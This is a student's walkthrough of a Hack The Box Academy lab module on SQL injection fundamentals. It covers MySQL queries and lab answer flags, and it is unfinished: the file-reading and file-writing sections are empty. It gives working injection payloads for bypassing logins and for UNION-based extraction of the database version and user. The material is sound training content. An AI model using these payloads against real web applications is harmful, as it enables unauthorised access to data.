# SQL Injection Fundamentals
* Source: [Hack the Box: Academy](https://academy.hackthebox.com/)
* Module: SQL Injection Fundamentals
* Tier: 0
* Difficulty: Medium
* Category: Offensive
* Time estimate: 8 hours
* Date: 11-05-2022
* Author: [DjikstraCS](https://github.com/DjikstraCS)

---
## Intro to MySQL
### Question:
![](./attachments/Pasted%20image%2020220511152736.png)

*Hint: Make sure to specify the non-default MySQL port in your command.*

First connect to the Database with `sql`.

```
┌──(kali㉿kali)-[~/XSStrike]
└─$ mysql -u root -h 138.68.158.33 -P 32598 -p         
Enter password: 
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 16
Server version: 10.7.3-MariaDB-1:10.7.3+maria~focal mariadb.org binary distribution

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.
```

Then display the databases.

```
MariaDB [(none)]> show databases;
+--------------------+
| Database           |
+--------------------+
| employees          |
| information_schema |
| mysql              |
| performance_schema |
| sys                |
+--------------------+
5 rows in set (0.043 sec)

MariaDB [(none)]> 
```

**Answer:** `employees`

---
## SQL Statements
### Question:
![](./attachments/Pasted%20image%2020220512151323.png)

*Hint: View records under the 'departments' table*

First, we login and print the databases.

```
┌──(kali㉿kali)-[~]
└─$ mysql -u root -h 157.245.33.77 -P 32686 -p  
Enter password: 
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 4
Server version: 10.7.3-MariaDB-1:10.7.3+maria~focal mariadb.org binary distribution

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [(none)]> show databases;
+--------------------+
| Database           |
+--------------------+
| employees          |
| information_schema |
| mysql              |
| performance_schema |
| sys                |
+--------------------+
5 rows in set (0.081 sec)

MariaDB [(none)]> use employees
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
```

The `emplyees` database looks interesting.

```
MariaDB [employees]> show tables;
+----------------------+
| Tables_in_employees  |
+----------------------+
| current_dept_emp     |
| departments          |
| dept_emp             |
| dept_emp_latest_date |
| dept_manager         |
| employees            |
| salaries             |
| titles               |
+----------------------+
8 rows in set (0.072 sec)
```

Print the `departments` table.

```
MariaDB [employees]> select * from departments;
+---------+--------------------+
| dept_no | dept_name          |
+---------+--------------------+
| d009    | Customer Service   |
| d005    | Development        |
| d002    | Finance            |
| d003    | Human Resources    |
| d001    | Marketing          |
| d004    | Production         |
| d006    | Quality Management |
| d008    | Research           |
| d007    | Sales              |
+---------+--------------------+
9 rows in set (0.068 sec)
```

**Answer:** `d005`

---
## Query Results
### Question:
![](./attachments/Pasted%20image%2020220512151748.png)

*Hint: Use AND operator*

Login and find the employee database like in previous questions.

```
MariaDB [employees]> select * from employees where hire_date="1990-01-01" && first_name LIKE "Bar%";
+--------+------------+------------+-----------+--------+------------+
| emp_no | birth_date | first_name | last_name | gender | hire_date  |
+--------+------------+------------+-----------+--------+------------+
|  10227 | 1953-10-09 | Barton     | Mitchem   | M      | 1990-01-01 |
+--------+------------+------------+-----------+--------+------------+
1 row in set (0.067 sec)
```

**Answer:** `Mitchem`

---
## SQL Operators
### Question:
![](./attachments/Pasted%20image%2020220512153141.png)

*Hint: Use OR/NOT conditions. Use 'describe titles;' to get the necessary column names.*

Login and select the `employee` database.

```
MariaDB [employees]> select * from titles where emp_no > 10000 or title!='Engineer' and title!='Senior Engineer' and title!='Assistant Engineer';
+--------+--------------------+------------+------------+
| emp_no | title              | from_date  | to_date    |
+--------+--------------------+------------+------------+
|  10001 | Senior Engineer    | 1986-06-26 | 9999-01-01 |
|  10002 | Senior Engineer    | 1995-12-03 | 9999-01-01 |
|  10003 | Engineer           | 1986-12-01 | 1995-12-01 |

(...)

|  10651 | Assistant Engineer | 1988-12-29 | 1997-12-29 |
|  10652 | Engineer           | 1997-12-29 | 2000-11-15 |
|  10653 | Senior Staff       | 2000-03-12 | 9999-01-01 |
|  10654 | Staff              | 1992-03-12 | 2000-03-12 |
+--------+--------------------+------------+------------+
654 rows in set (0.193 sec)

```

**Answer:** `654`

---
## Subverting Query Logic
### Question:
![](./attachments/Pasted%20image%2020220512155257.png)

*Hint: Check the cheat sheet for the payload needed.*

The web page:

![](./attachments/Pasted%20image%2020220512161641.png)

Payload: `tom' OR '1'='1`

![](./attachments/Pasted%20image%2020220512161624.png)

**Answer:** `202a1d1a8b195d5e9a57e434cc16000c`

---
## Using Comments
### Question:
![](./attachments/Pasted%20image%2020220512161804.png)

*Hint 1: Look at what the original query is doing, and try to inject a payload that changes its logic, and always logs in as user ID 5.*

*Hint 2: use OR.*

Comments in SQL:

```
-- <comment>
# <comment>
/*<comment>*/
```

Page is the same as last time.

This time, payload `' OR id = 5) -- <comment>` logs us in as `superadmin`.

![](./attachments/Pasted%20image%2020220512163040.png)

**Answer:** `cdad9ecdf6f14b45ff5c4de32909caec`

---
## Union Clause
### Question:
![](./attachments/Pasted%20image%2020220512163606.png)

*Hint: Use the 'describe' function to find number and names of columns in each table, to be able to form the proper 'union' query.*

Login and select the `employee` database.

```
MariaDB [employees]> SELECT emp_no FROM employees UNION SELECT dept_no FROM departments;
+--------+
| emp_no |
+--------+
| 10001  |
| 10002  |
| 10003  |

(...)

| d007   |
| d008   |
| d009   |
+--------+
663 rows in set (0.071 sec)
```


**Answer:** `663`

---
## Union Injection
### Question:
![](./attachments/Pasted%20image%2020220512165546.png)

*Hint: Try to replicate the last example*

The page:

![](./attachments/Pasted%20image%2020220512173615.png)

We can display the entire table with `' OR 1=1 -- -`

![](./attachments/Pasted%20image%2020220512175222.png)

We want to find the total number of columns since some of them are often hidden. 

This can be done with either `union` or `sort by`.

Payloads: 

```
' order by <number>-- -
```

and

```
cn' UNION select 1,2,3,4-- -
```

UNION returns:

![](./attachments/Pasted%20image%2020220512175157.png)

Now that we have confirmed that we have 4 columns, we can try and inject something in one of them to to see if it displays. 

Column number two seems to print the result.

Payload: `cn' UNION select 1,@@version,3,4-- -`

![](./attachments/Pasted%20image%2020220512174912.png)

To find the user, we will simply replace `@@verion` with `user()`.

Payload: `cn' union select 1,user(),3,4-- -`

![](./attachments/Pasted%20image%2020220512175625.png)

**Answer:** `root@localhost`

# TO BE CONTINUED...

---
## Database Enumeration
### Question:
![](./attachments/Pasted%20image%2020220512175803.png)



**Answer:** ``

---
## Reading Files
### Question:
![](./attachments/Pasted%20image%2020220512182854.png)

*Hint: Once you identify the name of the imported configuration file, try to read the source of these files.*


**Answer:** ``

---
## Writing Files
### Question:
![](./attachments/Pasted%20image%2020220512182945.png)

*Hint: It's one directory away from you!*



**Answer:** ``

---
## Skills Assessment
### Question:
![](./attachments/Pasted%20image%2020220512183044.png)

*Hint: Try to read files you know to find a location you can write to.*



**Answer:** ``

---
**Tags:** [[Hack The Box Academy]]